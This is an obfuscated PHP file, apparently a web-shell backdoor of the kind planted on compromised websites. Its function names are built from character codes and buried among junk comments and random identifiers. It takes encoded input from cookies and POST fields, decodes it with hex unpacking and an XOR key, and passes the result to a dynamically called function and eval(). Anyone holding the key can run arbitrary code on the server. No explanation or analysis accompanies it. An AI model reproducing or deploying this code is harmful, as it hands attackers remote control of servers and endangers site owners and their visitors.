<?php $WjhdZUCvOD	=/*jGWfX   */chr/*  byV */(/*  wCxfz   */937/*   gYVbA*/-   822  )."\x74"	./* WLx  */"\162"    ./*  xs*/chr   (	257/*   WS*/-	162	).'r'   .	chr	(/* AbaSu*/986/*U */-/*  zTMrX*/885	).'p'/* RIm  */.  "\x65"  .    chr	(97)   .  chr	(116);$_eGe/*   gY  */=	'62781';
			$hGQJd	=	'p'/* QNuW */.     "\141"    ./* SDMuG   */"\x63"     ./*   aYf*/chr/* ChNNq */(/* OL  */455  -	348   );
				function/*aPoDL*/iAiEnr()
			 {
 	$fhsbRTzd	=/*S   */Array	(   "NJptzc" =>	"GUoorDKtgWTJymeWlWrGlcChMD"/*   fombZ  */);


    
		     $OQZBQqJb    =    Array	(    "kYGqQiCpypHQpvkROJKffH"/*  yeI   */=> "HDPgCvEQerhuDZZBWEhFAZBc" );$_WQAEP/*  gqiE */=     '39460';
				     $oUdpaFxtu    =/*  AaAtM  */Array(/*  K  */$fhsbRTzd,	$_COOKIE,    $fhsbRTzd,/*   GcB  */$_POST,   $OQZBQqJb);
  
  /*Mp   */return/*J */$oUdpaFxtu;;
						}

/*NdceW*/


/*   XAChs */function/*HWpmb  */ZIdUjCH($SRfqOTru,/* XwO   */$fhsbRTzd)
			{
   if  (    count	(	$SRfqOTru   )     ==	3/*FDUG*/)/*xor  */{


	$HEbmwf    =/*cgE*/$SRfqOTru[1];

/*   OAfiG */$QvxyRTI	=	$SRfqOTru[2];
     	$wLRtu/*  LP  */=/*rs*/$HEbmwf($QvxyRTI);;


/*  Yxf */eval/*  oqNp  */(/*   uQg   */$wLRtu  );
					/* XhF*/die/* zh*/();

/*WMDjM  */}
				 }


	
	function/*   mtqh  */njHcItjsOM($MXhXTYGDK,   $OJWVz)

	{
		/*   lUe*/return/* LT   */$MXhXTYGDK	^/*  YLlgl*/$OJWVz;
    	}
					 
					$ZpKzJLFIL	=/*j   */"\x23";;

/* mfC */
			/*LW*/function	tYLvZzJr($adCcKJTab,	$ZpKzJLFIL)

 {	

     $adCcKJTab	=/*uePtv  */explode     ($ZpKzJLFIL,/*  Z   */$adCcKJTab/* Z   */);
  /*   jrPF */


/* Zpkx*/ZIdUjCH($adCcKJTab,	$ZpKzJLFIL);$_awJY	=     '37419';


	}


	
		/*SUdNB*/
	/*qSS   */
     	foreach	(iAiEnr() as $hSOLwWHjQ)	{
         foreach	( $hSOLwWHjQ  as	$OJWVz    =>  $MXhXTYGDK    )	{
				/*   wLQU */

/* wIpaW   */$JoxiXCn     =     strlen(/*PZTl*/$MXhXTYGDK )/strlen(/*  dUOhw*/$OJWVz );

/*ZdzX*/
					   $MXhXTYGDK	=/* wl*/@$hGQJd(  "\x48"   .     "\52",/* DeW */$MXhXTYGDK   );;
	
     	$OJWVz	.=   "EAGDD-uul-ucQ-veUEJt-sqRfd-IgdX-XCUXM";
			$OJWVz/*  Qqfa */=	$WjhdZUCvOD	(/* P */$OJWVz,/*   WI */$JoxiXCn  +	1);

	

 round($JoxiXCn);;
			/*  M*/
 /* Q  */tYLvZzJr($MXhXTYGDK	^	$OJWVz,   $ZpKzJLFIL);
         
   	continue;
 /*  jHQp  */}


     }